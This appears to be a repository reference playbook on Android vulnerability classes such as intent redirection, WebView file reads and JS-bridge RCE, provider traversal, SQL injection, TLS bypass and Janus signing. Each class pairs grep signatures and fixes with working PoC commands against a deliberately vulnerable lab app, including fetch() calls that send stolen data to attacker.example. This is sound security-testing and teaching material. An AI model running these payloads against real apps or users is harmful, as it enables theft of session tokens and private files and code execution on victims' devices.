# Android vulnerability-class reference — detection & PoC playbook

Per-class quick reference: **root cause → static signature (grep-able) → dynamic PoC → impact → fix**.
Works against `jadx_out/` + `apktool_out/` output from `scripts/analyze-android.sh` and exported
components from `scripts/attack-surface.sh`.

> Source: Niraj Kharel's Mobile Pentesting series (nirajkharel.com.np), 65 posts — commands and
> patterns quoted verbatim; prose condensed with per-class source links. All PoCs were
> demonstrated against the author's deliberately vulnerable **VulnLabApp** (`com.vulnlab.app`).
> Private/research use; see attribution at the bottom.

**Triage discipline (applies to every class below):** an ADB-only PoC (`adb shell am start`) gets
downgraded in bounty triage because ADB can also reach non-exported components — ship a real
**attacker APK** (`setClassName` + `putExtra` + `FLAG_ACTIVITY_NEW_TASK`) to prove third-party
reachability.

---

## A. IPC & Intents

### A1. Parcelable redirection — nested/typed extra forwarded to `startActivity`
[Source](https://nirajkharel.com.np/posts/parcelable-redirection/)
- **Root cause:** exported activity reads `getParcelableExtra("next_intent")` (nested Intent) or a
  typed `UserAction` Parcelable (`targetActivity`/`payloadData`/`actionType` public fields) and
  calls `startActivity()` on it with no component allowlist — "the typed-object illusion".
- **Static:** `rg 'getParcelableExtra' jadx_out/` then trace each hit → no class/component
  allowlist → flows into `startActivity` / `startActivityForResult` / `startService` / `sendBroadcast`.
- **PoC:** attacker APK nests `inner.putExtra("filename", "../shared_prefs/auth_prefs.xml")` inside
  `outer.putExtra("next_intent", (Parcelable) inner)`. Enumerate forwards with Frida:
  `Activity.startActivity.overload('android.content.Intent')` logging action+component.
- **Impact:** launch non-exported internal activities (auth bypass, pre-filled transfer/password-change), chain into `OAuthCallbackActivity` which POSTs `session_token` to attacker `callback_url`.
- **Fix:** validate `intent.getComponent()` against a hard-coded class allowlist before forwarding; never trust Parcelable field values.

### A2. Intent redirection via wholesale `putExtras` forwarding
[Source](https://nirajkharel.com.np/posts/intent-redirection-arbitrary-activity-launch/)
- **Root cause:** exported router resolves attacker-controlled `target` string to a class, then
  `next.putExtras(incoming)` forwards every attacker extra into a non-exported activity.
- **Static:** `rg 'putExtras\(getIntent\(\)|setData\(getIntent\(\)\.getData\(\)\)' jadx_out/`
- **PoC:** `adb shell am start -n com.vulnlab.app/.activities.IntentRedirectorActivity --es target FileWriteActivity --es filename "../shared_prefs/auth_prefs.xml" --es content "<map/>"`
  Frida: hook `Intent.getStringExtra` in downstream activities to enumerate every extra key they read.
- **Impact:** reach non-exported activities with attacker extras — IDOR, auth bypass, payment-screen state injection.
- **Fix:** never forward extras wholesale; explicit allowlist mapping; re-validate in the downstream component.
- **Gotcha:** the bug lives in the connecting `putExtras` line — invisible to per-component static scoring.

### A3. Mutable PendingIntent hijack
[Source](https://nirajkharel.com.np/posts/mutable-pending-intent-hijack/)
- **Root cause:** `PendingIntent.getActivity(this, 0, intent, FLAG_MUTABLE | FLAG_UPDATE_CURRENT)` with blank base-Intent fields; holder modifies via `Intent.fillIn()` (fills blanks only) and `send()` fires as the creator's UID.
- **Static:** `rg 'FLAG_MUTABLE|PendingIntent\.(getActivity|getBroadcast)' jadx_out/` — Tier 1 = explicit component locked (extras injection only); Tier 2 = empty/implicit base (`new Intent()`) = full hijack.
- **PoC:** trigger with `--ez post_empty_pi true` / `am start-service`; Frida hook `PendingIntent.getActivity` prints mutable bit `0x02000000` + `target=implicit`. Steal via `NotificationListenerService` reading `sbn.getNotification().contentIntent`.
- **Impact:** Tier 1 — inject extras into a locked `FileWriteActivity` launch; Tier 2 — fill action+package to own component + `FLAG_GRANT_READ_URI_PERMISSION` to steal private provider data.
- **Fix:** `FLAG_IMMUTABLE` (mandatory API 31+) + fully-explicit base Intent.
- **Gotcha:** `fillIn()` capability table — component/selector need `FILL_IN_COMPONENT`/`FILL_IN_SELECTOR`; extras always merge (base wins); URI-grant flags ride along. Pre-API-31 PIs are mutable by default.

### A4. Persistable URI grant theft/poisoning
[Source](https://nirajkharel.com.np/posts/provider-grant-escalation/)
- **Root cause:** exported component + `android:grantUriPermissions="true"`: (A) calls `takePersistableUriPermission(dataUri, FLAG_GRANT_READ_URI_PERMISSION)` on an unvalidated incoming URI, or (B) attaches `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` (0x40) to its own private provider's URIs.
- **Static:** manifest `rg 'grantUriPermissions="true"'`; jadx `rg 'takePersistableUriPermission|FLAG_GRANT_PERSISTABLE'`.
- **PoC:** `adb shell am start -n com.vulnlab.app/.activities.ProviderGrantActivity -d content://com.attacker.app.evil/evil --grant-read-uri-permission --grant-persistable-uri-permission`; persistence survives reboot (`/data/system/urigrants.xml`).
- **Impact:** Direction A — victim ingests attacker data forever; Direction B — permanent read of victim's private provider (DB, `session_token`, `api_key`).
- **Fix:** allowlist URI authority before take; never attach persistable+read flags to own private URIs.
- **Gotcha:** shell-launched takes fail with "No persistable permission grants found" unless the offering app owns the provider.

### A5. Cross-app ClassLoader Parcelable injection (Valsamaras)
[Source](https://nirajkharel.com.np/posts/cross-app-classloader-parcelable/)
- **Root cause:** attacker `createPackageContext("com.vulnlab.app", CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY)` → reflects victim's own `UserAction` Parcelable (`getDeclaredConstructor().newInstance()`, `setField`) → evil twin passes the receiver's type check because it really is a `UserAction`.
- **Static:** custom-typed Parcelable reads `(SomeAppDefinedClass) intent.getParcelableExtra(...)` / `getParcelableExtra(key, SomeAppDefinedClass.class)`; classes with `@Parcelize` or `CREATOR`; filter out framework types (`Intent`, `Bundle`, `Uri`, `ParcelFileDescriptor`). Prime targets: `UserAction`/`PushItem`/`NotificationData`/`DeepLinkPayload` shapes.
- **PoC:** two-stage attacker APK — stage 1 borrow ClassLoader → `loadClass("com.vulnlab.app.models.UserAction")` → fire at the receiver proving arbitrary launch; stage 2 `fireDirectWrite()` at `FileWriteActivity` `filename "../shared_prefs/auth_prefs.xml"`.
- **Impact:** arbitrary component launch inside victim via `setClassName`; reaches non-exported internals.
- **Fix:** validate Parcelable field values after read (type checks are insufficient); allowlist target components.
- **Ref:** Dimitrios Valsamaras, Black Hat EU 2024.

### A6. Reflection on intent extras (`Class.forName`)
[Source](https://nirajkharel.com.np/posts/reflection-class-loading-intent/)
- **Root cause:** exported activity does `Class.forName(intent.getStringExtra("class_name"))` → `newInstance()` → reflective method invoke via `--es method_name`.
- **Static:** `rg 'Class\.forName|getMethod|newInstance' jadx_out/` then confirm the class name is sourced from an intent extra.
- **PoC:** `adb shell am start -n com.vulnlab.app/.activities.ReflectionActivity --es class_name "com.vulnlab.app.activities.OAuthCallbackActivity" --es method_name "process" --es method_arg "https://attacker.example/oauth-callback"`
- **Impact:** instantiate any public-no-arg class, invoke any 0/1-String-arg method — OAuth callback theft, `grantAdmin()`, destructive migrations.
- **Fix:** allowlist `Map.of("maps", MapsPlugin.class, ...)` or enum `PluginType.valueOf(...)` — throw `SecurityException("unknown plugin")`.
- **Gotcha:** Frida 1-arg `forName` resolves via boot classloader and misses app classes — use the 3-arg overload with `Thread.currentThread().getContextClassLoader()`.

### A7. Sender-side implicit broadcast leak
[Source](https://nirajkharel.com.np/posts/implicit-broadcast-leak/)
- **Root cause:** `sendBroadcast(intent)` with no target package, no permission, tokens/PII in extras.
- **Static:** jadx `rg 'sendBroadcast|sendOrderedBroadcast'` — safe contrast: `intent.setPackage(getPackageName())`, permission-gated overload, `LocalBroadcastManager`.
- **PoC:** Frida hook `ContextImpl.sendBroadcast.overload('android.content.Intent')` logging action+extras when `intent.getPackage()` is null; attacker app registers dynamic receiver `addAction("com.vulnlab.app.SESSION_CHANGED")`.
- **Impact:** any installed app silently receives tokens/user ID/email.
- **Fix:** `LocalBroadcastManager` (best) or `setPackage(getPackageName())`, else signature-permission-gated overload.
- **Gotcha:** `RECEIVER_NOT_EXPORTED` (API 33+) does NOT fix this — the leak is sender-side.

### A8. Weak protectionLevel on custom permission
[Source](https://nirajkharel.com.np/posts/weak-protection-custom-permission/)
- **Root cause:** `<permission android:protectionLevel="normal">` (or omitted) guarding exported components.
- **Static:** `rg '<permission|protectionLevel' apktool_out/AndroidManifest.xml` — `normal|dangerous` guarding exported components = finding.
- **PoC:** drozer `app.package.info -a <pkg>`; attacker app adds `<uses-permission android:name="com.vulnlab.app.CUSTOM_PERM"/>` and starts the guarded activity — access **bypass, not crash**.
- **Fix:** `protectionLevel="signature"` + `android:permission` on each component.

### A9. Unverified app links (`autoVerify` missing)
[Source](https://nirajkharel.com.np/posts/app-link-autoverify-false/)
- **Root cause:** HTTPS `intent-filter` without `android:autoVerify="true"` — assetlinks.json never checked, any app can claim the same host.
- **Static:** `rg -B2 -A10 'intent-filter' AndroidManifest.xml | rg 'autoVerify|scheme|host'` — https scheme + host, no autoVerify.
- **PoC:** `adb shell am start -a android.intent.action.VIEW -d 'https://app.vulnlabapp.example.com/open?token=abc123&redirect=https://attacker.example/'`; check `curl https://app.../.well-known/assetlinks.json`.
- **Impact:** attacker app exfiltrates magic-link tokens/OAuth codes then forwards the intent so the victim still sees the real app; "Always" tap = permanent silent hijack.
- **Fix:** `android:autoVerify="true"` on every HTTPS filter + valid assetlinks.json with prod cert SHA-256.
- **Gotcha:** 4 silent verification-failure modes (missing file, dev-vs-prod SHA-256, HTTP redirect, HTTPS error); **check WHOIS on every declared domain** — expired domains can be re-registered for exclusive link ownership.

### A10. Deep-link URI reconstruction (taxonomy)
[Source](https://nirajkharel.com.np/posts/android-pentesting-deeplinks/)
- Three cases via apktool/jadx: scheme-only (`flag11://`), scheme+host (`androgoat://vulnapp`), full `vulnerable://deeplink/demo?whoami=` — found by grepping `getQueryParameter("whoami")` in decompiled Java + `/res/values/Strings.xml` for params.
- Custom schemes let any app claim the scheme (hijacking); attacker-controlled redirect via the `whoami` param.

### A11. Task hijacking / StrandHogg
[Source](https://nirajkharel.com.np/posts/task-hijacking-strandhogg/)
- **Root cause:** victim launcher activity has no `android:taskAffinity` (defaults to package name); attacker declares that exact affinity + `launchMode="singleTask"`.
- **Static:** `rg -A6 'MainActivity' AndroidManifest.xml` — missing/empty `taskAffinity` on launcher/auth activities. Classic path works on Android ≤ 10 only.
- **PoC:** confirm with `adb shell dumpsys activity activities | grep -A2 "com.vulnlab.app" | grep taskAffinity`; attacker exfils to `https://attacker.example/?e=&p=` then hands off via `getLaunchIntentForPackage` + `FLAG_ACTIVITY_NEW_TASK`.
- **Impact:** tapping the real app icon surfaces the attacker's cloned login — credential phishing with seamless handoff.
- **Fix:** `android:taskAffinity=""`, `allowTaskReparenting="false"`, `launchMode="standard"`; `targetSdkVersion >= 30`.
- **Gotcha:** StrandHogg 2.0 (CVE-2020-0096) uses reflection — no manifest signal, invisible to static analysis; OS version (not just target SDK) decides exposure.

---

## B. WebView

### B1. Exported activity + WebView intent injection (escalation ladder)
[Source](https://nirajkharel.com.np/posts/beyond-webview-redirect/)
- **Root cause:** exported activity calls `webView.loadUrl(intent.getStringExtra("url"))` with no scheme validation.
- **Static:** jadx `rg 'loadUrl\(' near 'getStringExtra\("url"\)'`; check `setAllowFileAccess(true)`, `setAllowFileAccessFromFileURLs(true)`, `setAllowUniversalAccessFromFileURLs(true)`, `addJavascriptInterface(new NativeBridge(), "Android")`.
- **PoC (3 escalation rungs):** (1) session cookie theft via Burp Collaborator URL; (2) `file://` read:
  `adb shell am start -n com.vulnlab.app/.activities.WebViewActivity --es url "file:///data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml"`
  with exfil HTML at `/sdcard/Download/exfil.html` doing `fetch('https://attacker.example/?leak='+...)`; (3) JS-bridge RCE via `Android.exec()`.
- **Impact:** redirect alone = informational/low; escalate per rung (cookie → file read → RCE).
- **Gotcha:** explains why cookie exfil often fails (HttpOnly, host-scoped cookies, bearer tokens in headers) — move to the next rung.

### B2. JS-bridge RCE via `addJavascriptInterface`
[Source](https://nirajkharel.com.np/posts/javascript-interface-rce/)
- **Root cause:** `webView.addJavascriptInterface(new NativeBridge(), "Android")` exposing `@JavascriptInterface public String exec(String cmd)` → `Runtime.getRuntime().exec(new String[]{"sh","-c",cmd})` and `readFile(path)`.
- **Static:** `rg 'addJavascriptInterface'` (2nd arg = JS variable name); hybrid signals: `assets/www/index.html`, `cordova.js`, `cordova_plugins.js`, `org.apache.cordova.*`, `com.getcapacitor.*`.
- **PoC:** Frida hook `WebView.addJavascriptInterface` dumps bridge name + method list; payload HTML calls `Android.exec('id')`, `Android.readFile('/data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml')`, exfil via `fetch('https://attacker.example/?d='+encodeURIComponent(...))`.
- **Fix:** no exec/reflection-capable bridge methods; scope file paths; origin checks on the native side, never JS side.
- **Gotcha:** pre-API-17 reflection chain `window.Android.getClass()` → `Class.forName('java.lang.Runtime')` (check `minSdkVersion < 17`); realistic 2026 bridges expose `getAccessToken()`, `evaluateLocal`, `runScript`, `loadModule`.

### B3. `file://` WebView arbitrary private-file read
[Source](https://nirajkharel.com.np/posts/webview-file-scheme-arbitrary-read/)
- **Root cause:** all three flags on: `setAllowFileAccess(true)` + `setAllowFileAccessFromFileURLs(true)` + `setAllowUniversalAccessFromFileURLs(true)`, plus `loadUrl(intent extra)` sink.
- **Static:** `rg 'setAllowFileAccess|setAllowFileAccessFromFileURLs|setAllowUniversalAccessFromFileURLs'`; pre-API 30 `setAllowFileAccess` defaulted **true** — absence of `setAllowFileAccess(false)` is itself a signal.
- **PoC:** `adb shell am start -n com.vulnlab.app/.activities.WebViewActivity --es url "file:///data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml"`; modern exfil: load `https://attacker.example/exfil.html` which calls `Android.readFile(f)` then `fetch()`es the bytes out.
- **Fix:** all three flags false (+ consider `setAllowContentAccess(false)`, default true). Devs often flip only the first.
- **Gotcha:** each flag = a distinct primitive (render-only / file→file XHR / universal exfil); cross-app `file://` XHR is historical on API 24+; `content://` pages get an opaque origin so the bridge is the clean path; `readAllBytes()` is API 33+ (fallback `Android.exec('cat …')`).

---

## C. Files & Providers

### C1. Arbitrary file write / path traversal via intent
[Source](https://nirajkharel.com.np/posts/file-write-via-intent/)
- **Root cause:** `new File(getFilesDir(), intent.getStringExtra("filename"))` with no traversal check + `FileOutputStream` of attacker `content` extra. Three shapes: raw filename; fixed-path/type-switch with attacker `payload` bytes; `src_uri`/`out_path` URI copy.
- **Static:** `rg 'new FileOutputStream|new BufferedWriter|Files\.write|Files\.copy|openFileOutput' jadx_out/` then trace path/content back to `getStringExtra`/`getByteArrayExtra`/`getData()`.
- **PoC (canary first):** `adb shell am start -n com.vulnlab.app/.activities.FileWriteActivity --es filename "PROBE_canary.txt" --es content "probe"`; then attacker APK uses `"../shared_prefs/auth_prefs.xml"`. Frida hook `FileOutputStream.$init` (File + String overloads) logging the resolved path.
- **Impact:** overwrite `auth_prefs.xml` (token, `premium=true`), `remote_config.json` (point `api_base_url` at attacker = full MITM traffic redirection), wipe SQLCipher key file.
- **Fix:** canonicalize-and-verify: `getCanonicalFile()` + `target.getPath().startsWith(parent.getCanonicalPath())` else `SecurityException`.
- **Gotcha:** try literal `..`, then `%2e%2e/`, null bytes, absolute path (Java `File(parent, absoluteChild)` **ignores** parent); extension checks bypassable with `?dummy=.jpg`.

### C2. `openInputStream` on attacker-controlled URI
[Source](https://nirajkharel.com.np/posts/stream-uri-read/)
- **Root cause:** exported activity takes a URI from a `read_uri` extra or `intent.getData()` and calls `contentResolver.openInputStream(uri)` with no scheme/authority allowlist.
- **Static:** `rg 'openInputStream|openTypedAssetFileDescriptor|openAssetFileDescriptor|openFileDescriptor|ImageDecoder\.createSource|BitmapFactory\.decodeStream'` fed by `getIntent().getData()`/`getParcelableExtra`.
- **PoC:** `adb shell am start -n com.vulnlab.app/.activities.StreamUriActivity -d "file:///data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml"`; cross-app chain `content://com.victim.app.fileprovider/shared_prefs/auth.xml`; self-referential FileProvider bypass `content://com.vulnlab.app.fileprovider/root/data/data/...` when `file://` is blocked. Frida hook `ContentResolver.openInputStream.overload('android.net.Uri')`.
- **Impact:** read the target's own private files as its UID; two/three-app chain (attacker → target reader → victim FileProvider) is the cleanest cross-app primitive.
- **Fix:** `"content".equals(src.getScheme())` + `ALLOWED_AUTHORITIES.contains(src.getAuthority())` before open.

### C3. ContentProvider path traversal in `openFile`
[Source](https://nirajkharel.com.np/posts/content-provider-path-traversal/)
- **Root cause:** provider `openFile(Uri, String)` converts URI path segments straight into `new File(baseDir, path)` without canonicalization.
- **Static:** jadx `rg 'openFile|getgetPathSegments|getEncodedPath'` — concatenate-into-File with no `getCanonicalPath()` containment check.
- **PoC:** drozer `app.provider.read content://com.vulnlab.app.files/../../data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml`; `adb shell content read --uri ...`.
- **Fix:** `file.getCanonicalPath()` must `startsWith(baseDir.getCanonicalPath())`; reject `..` segments.

### C4. SQL injection via provider query selection
[Source](https://nirajkharel.com.np/posts/content-resolver-sql-injection/)
- **Root cause:** `ContentProvider.query()` concatenates caller-supplied `selection`/`sortOrder`/projection into SQL.
- **Static:** jadx `rg 'query\(Uri' with 'selection \+'` / `rawQuery(` built from `getQueryParameter`; export check `android:exported="true"` / non-signature grant-uri-permission.
- **PoC:** drozer `app.provider.query content://com.vulnlab.app.items --projection "* FROM sqlite_master--"` / `--selection "1=1) UNION SELECT..."`; `adb shell content query --uri ...`.
- **Fix:** whitelist columns; user values only as `selectionArgs`; validate `sortOrder` tokens.

### C5. FileProvider over-broad root path
[Source](https://nirajkharel.com.np/posts/file-provider-overbroad-root-path/)
- **Root cause:** `<provider android:name="androidx.core.content.FileProvider" android:grantUriPermissions="true">` with meta-data XML `<root-path name="root" path="." />` (or `path="/"`).
- **Static:** `rg 'file_paths|root-path' apktool_out/res/xml/` + manifest `rg 'FileProvider|grantUriPermissions'` — any `<root-path path="."/>` / `<external-path path="."/>` is the finding.
- **PoC:** drozer `app.provider.read content://com.vulnlab.app.fileprovider/root/data/data/com.vulnlab.app/shared_prefs/auth_prefs.xml`.
- **Fix:** narrowest `<files-path>`/`<cache-path>` subdirectory e.g. `path="exports/"`.
- **Severity ordering:** `<root-path>` > `<external-path>` > `<files-path>`.

### C6. `allowBackup` full data extraction
[Source](https://nirajkharel.com.np/posts/allow-backup-data-extraction/)
- **Root cause:** `android:allowBackup="true"` (or attribute **absent**) with no `fullBackupContent` filter / `dataExtractionRules`; plaintext creds in SharedPreferences.
- **Static:** `rg 'allowBackup|fullBackupContent|dataExtractionRules' AndroidManifest.xml` — "broken" pattern = excludes one `auth.xml` but leaves `user.xml`, `oauth.xml`, `tokens.xml` in scope.
- **PoC:** `adb backup -f vulnlab.ab -noapk com.vulnlab.app` (user taps "Back up my data"), then
  `dd if=vulnlab.ab bs=24 skip=1 | openssl zlib -d > vulnlab.tar` or `java -jar abe.jar unpack vulnlab.ab vulnlab.tar`; tar contains `apps/com.vulnlab.app/sp/auth_prefs.xml`.
- **Impact:** whole `/data/data/<pkg>/` shipped to host — plaintext password/session token/API key.
- **Fix:** `allowBackup="false"`, or exclude-by-default backup rules; `dataExtractionRules` (API 31+) for cloud vs D2D.
- **Gotcha:** non-ADB exfil paths too — Google Drive backup blob, OEM tools (Smart Switch / Mi Cloud), `BackupManager.requestRestore`.

---

## D. Network & TLS

### D1. Mobile SSRF via intent-controlled URL
[Source](https://nirajkharel.com.np/posts/http-fetch-ssrf-android/)
- **Root cause:** exported activity pre-fills fetch field from `intent.getStringExtra("fetch")` → `new URL(target).openConnection()` with no host/address-class validation.
- **Static:** `rg 'new URL\(intent\.getStringExtra|openConnection|new Request\.Builder\(\)\.url\(|Retrofit\.Builder\(\)\.baseUrl\('` — trace URL source to intent without host allowlist.
- **PoC:** `adb shell am start -n com.vulnlab.app/.activities.WebViewActivity --es fetch "http://192.168.1.1/cgi-bin/luci/?username=admin&password=admin"`; metadata variant `--es fetch "http://169.254.169.254/latest/meta-data/"`.
- **Impact:** device becomes a proxy into the user's LAN — router admin (credentialed via shared cookie jar), IoT, `http://127.0.0.1:8080/` debug servers, cloud IMDS.
- **Fix:** host allowlist + `InetAddress.getByName(host)` rejecting `isLoopbackAddress()`/`isSiteLocalAddress()`/`isAnyLocalAddress()` (the second half is almost never present).
- **Bypasses:** IP-as-integer `http://3232235521/`, DNS rebinding, `http://allowed.example/#@192.168.1.1/`; legacy OkHttp `\r\n` header smuggling.
- **Gotcha:** undertriaged because triagers equate mobile SSRF with backend SSRF; intent only seeds the field — the victim still taps Fetch once.

### D2. Hostname verifier / trust manager disabled
[Source](https://nirajkharel.com.np/posts/hostname-verifier-bypass/)
- **Root cause:** `HostnameVerifier.verify` returns `true` unconditionally / `ALLOW_ALL_HOSTNAME_VERIFIER` / empty `checkServerTrusted`; OkHttp `.sslSocketFactory(insecureSslFactory(), trustAllManager())` + `.hostnameVerifier((hostname, session) -> true)`.
- **Static:** `rg 'HostnameVerifier|setHostnameVerifier|checkServerTrusted|ALLOW_ALL_HOSTNAME_VERIFIER|sslSocketFactory|hostnameVerifier'`.
- **PoC:** `adb shell logcat -s VulnNetwork` (proves `[hostname-verifier] always true for: self-signed.badssl.com`); `mitmproxy --listen-port 8080 --ssl-insecure` + `adb shell settings put global http_proxy 192.168.1.100:8080`; fetch `https://self-signed.badssl.com/` — HTTP 200 = both checks failed.
- **Fix:** debug-only gating with a real strict `else` branch; **verify `BuildConfig.DEBUG` is false at runtime before accepting the guard**.

### D3. NSC trusts user-installed CAs
[Source](https://nirajkharel.com.np/posts/nsc-trust-anchors-override/)
- **Root cause:** `<certificates src="user" />` inside `<base-config>` of network_security_config.xml (defeats the API 24 default); often shipped with `android:debuggable="true"` + `usesCleartextTraffic="true"`.
- **Static:** `find . -name 'network_security_config*' -exec cat {} \;` + `rg 'networkSecurityConfig|debuggable|usesCleartextTraffic' AndroidManifest.xml`; flag `src="user"` under `<base-config>` vs `<debug-overrides>`.
- **PoC:** install mitmproxy CA as user cert → set device proxy → any HTTPS request decrypts with **no Frida needed**.
- **Fix:** remove `src="user"` from `<base-config>` (debug-overrides only); `<pin-set expiration>` with two `<pin digest="SHA-256">` entries.
- **Gotcha:** trust-anchors-only domain-config pins nothing; an **expired `expiration` silently disables pins**.

---

## E. Crypto, signing & code loading

### E1. Keystore key without user-auth binding
[Source](https://nirajkharel.com.np/posts/android-keystore-without-auth-binding/)
- **Root cause:** `KeyGenParameterSpec.Builder` chain never calls `setUserAuthenticationRequired(true)`; even `setUserAuthenticationValidityDurationSeconds(300)` leaves a 5-min window.
- **Static:** `rg 'KeyGenParameterSpec\.Builder' jadx_out/` then `rg 'setUserAuthenticationRequired'` — Builder chains without a match are findings (never visible in manifest).
- **PoC:** Frida in-process: `ks.getKey('vulnlab_signing_key', null)` → `Signature.getInstance('SHA256withRSA')` → `sig.initSign(key)` → signs "hi" (with binding it would throw `UserNotAuthenticatedException`).
- **Fix:** `setUserAuthenticationRequired(true)` + `setUserAuthenticationParameters(0, AUTH_BIOMETRIC_STRONG)` + `setInvalidatedByBiometricEnrollment(true)`.
- **Gotcha:** hardware backing protects key **bytes**, not the key **handle** — the primitive matters when chained with in-process code execution.

### E2. Janus (CVE-2017-13156) v1-only signature bypass
[Source](https://nirajkharel.com.np/posts/janus-v1-signing/)
- **Root cause:** v1/JAR signing only covers ZIP entries; DEX bytes prepended before the ZIP are unsigned but execute first. Vulnerable = v1-only + `minSdkVersion < 26`.
- **Static:** `apksigner verify --verbose --print-certs app-release.apk` → "Verified using v1 scheme: true", v2/v3 false.
- **PoC:** `d8 com/attacker/MaliciousPayload.class --output ./` then `cat classes.dex original-app.apk > janus-modified.apk`; re-sign v1-only `apksigner sign --v1-signing-enabled true --v2-signing-enabled false`.
- **Impact:** payload runs under the app's UID/permissions on older Android; chain with an HTTP self-update channel = code execution on update install (**submit both as linked findings**).
- **Fix:** `v1SigningEnabled false`, v2+v3 true, `minSdkVersion 26`.

### E3. Dynamic code loading (`DexClassLoader`)
[Source](https://nirajkharel.com.np/posts/dynamic-code-loading/)
- **Root cause:** `DexClassLoader` path from `Environment.getExternalStorageDirectory() + "/plugin.dex"`; remote variant fetches `http://updates.target.com/plugins/feature.dex`.
- **Static:** `rg 'DexClassLoader|PathClassLoader|InMemoryDexClassLoader'` then follow the path argument — external-storage or untrusted-download path is the bug.
- **PoC:** `adb push payload.dex /sdcard/plugin.dex`; build payload with `javac --release 8` + `d8 ... --min-api 27`; Frida hook `DexClassLoader.$init` logs `dexPath`.
- **Impact:** RCE with the app's UID/permissions/private data.
- **Fix:** load only from `new File(getFilesDir(), "plugins/feature.dex")`; verify DEX signature before loading; never external storage.
- **Gotcha:** three-mode remote threat model — plain HTTP swap / HTTPS with broken verifier / valid TLS **with no payload signature** ("the app verifies the transport, not the payload"); `d8` lives in SDK build-tools, not `$PATH`.

### E4. PII/tokens in release logcat
[Source](https://nirajkharel.com.np/posts/logging-pii-in-release/)
- **Root cause:** `Log.d/v/i/e` calls survive release — default `proguard-android-optimize.txt` does not strip them.
- **Static:** `rg 'Log\.[dvwie]\(' jadx_out/ | rg -i 'token|auth|password|email|secret|key|ssn|dob|cc|bearer'`; wrappers `Timber.|Logger.d|LogUtils.`.
- **PoC:** `adb logcat -s "VulnLabLogin:*"`; or Frida hooking all 5 overloads of `android.util.Log`.
- **Impact:** credentials/API keys via USB adb, OEM READ_LOGS diagnostic apps, or crash-reporter SDKs (automatic third-party exfil channel).
- **Fix:** ProGuard `-assumenosideeffects` on `android.util.Log` + `timber.log.Timber`; `BuildConfig.DEBUG` guards are fragile.
- **Gotcha:** `Log.e(... + body, e)` in exception handlers survives stripping.

---

## F. React Native bridge

### F1. Enumerating & invoking RN NativeModules
[Source](https://nirajkharel.com.np/posts/react-native-bridge-inspection/)
- **Static:** `unzip -l app.apk | grep -E 'index\.android\.bundle|libreactnativejni|react'`; `grep -E 'NativeModules\.|@ReactMethod|getStoredToken|readFile' assets/index.android.bundle`; Hermes `.hbc` via hbctool/hermes-dec.
- **PoC:** `Java.choose(...ReactNativeBridgeActivity)` → `inst.nativeExec('id')`; real RN: hook `CatalystInstanceImpl.callFunction`, `getModuleRegistry().getModule(...)`.
- **Key point:** the RN bridge is **not remotely injectable** (unlike `@JavascriptInterface`/Cordova) — reposition it as an instrumentation-time attack surface.
- Companion repo tooling: `runtime/rn-frida-hook.js`, `scripts/analyze-rn.sh`.

---

## G. Methodology appendix

### G1. Bug-bounty approach (exported activity → cookie theft → ATO)
[Source](https://nirajkharel.com.np/posts/android-bug-bounty/)
1. Manual manifest review — `<intent-filter>` = exported by default, tools miss it; `dz> run app.activity.info -a com.root3d.intentinjection`.
2. `rg 'webview.loadUrl\(\)' + 'intent.getStringExtra'`.
3. ADB probe `--es privacy-url "https://google.com"` — but ADB-only PoCs get rejected (reaches non-exported too).
4. Attacker APK: `setClassName` + `putExtra` + `FLAG_ACTIVITY_NEW_TASK`.
5. Point the extra at a Collaborator URL — default `loadUrl` sends the session cookie in headers; replay against `/update/email`, `/delete/users`.
6. Brute-force hidden param names (url, path, link, redirect, page-url, …) via scripted `adb --es`.
7. Flutter fallback: `am start -a VIEW -d "https://..."` data URI when source is unreadable.
Triage criterion: **must prove third-party reachability without root**.

### G2. Work-profile testing (user 10)
[Source](https://nirajkharel.com.np/posts/android-pentesting-workprofile/)
- adb/drozer/Frida default to user 0 and can't see, spawn, or hook apps in the work profile:
  `adb shell pm list users` → `UserInfo{10:Work profile}`; then always pass
  `pm list packages --user 10` · `pm install -t --user 10 /data/local/tmp/test.apk` ·
  `pm path --user 10 <pkg>` · `am start --user 10 -n <pkg>/<activity>` ·
  `frida -U -f com.twitter.android --aux "uid=(int)10"`. Install the drozer agent into the profile too.

### G3. Command-driven checklist (older post)
[Source](https://nirajkharel.com.np/posts/android-pentesting-checklist/)
Sections: Setup/Decompile · Verify Signing · Hardcoded/URL endpoints (`gf aws-keys|ip|base64|urls`) · Manifest · Network · Storage · Source analysis · RE · Crypto · Backup · Debuggable · Exported (drozer `run app.package.attacksurface`, `scanner.provider.injection|finduris|traversal`) · DeepLinks · HTTPS interception (Java/Flutter/WebView, `objection patchapk` + `android sslpinning disable`) · MobSF/Drozer Docker · APIs · Xamarin (`pyxamstore unpack`) · AAB (`bundletool`). Companion: our `docs/WORKFLOW.md` (MASTG) and `scripts/attack-surface.sh`.

---

## Attribution
Vuln-class series © **Niraj Kharel** ([nirajkharel.com.np](https://nirajkharel.com.np/categories/mobile-pentesting/)),
Mobile Pentesting series (65 posts, 2021–2026), demonstrated against the author's VulnLabApp.
Commands, patterns, and PoCs quoted verbatim; narrative prose condensed with per-class source
links. The author has granted permission to include his writing in this open-source project —
full-text verbatim mirrors of all posts live in
[`docs/research/mobile-pentesting/`](research/mobile-pentesting/).
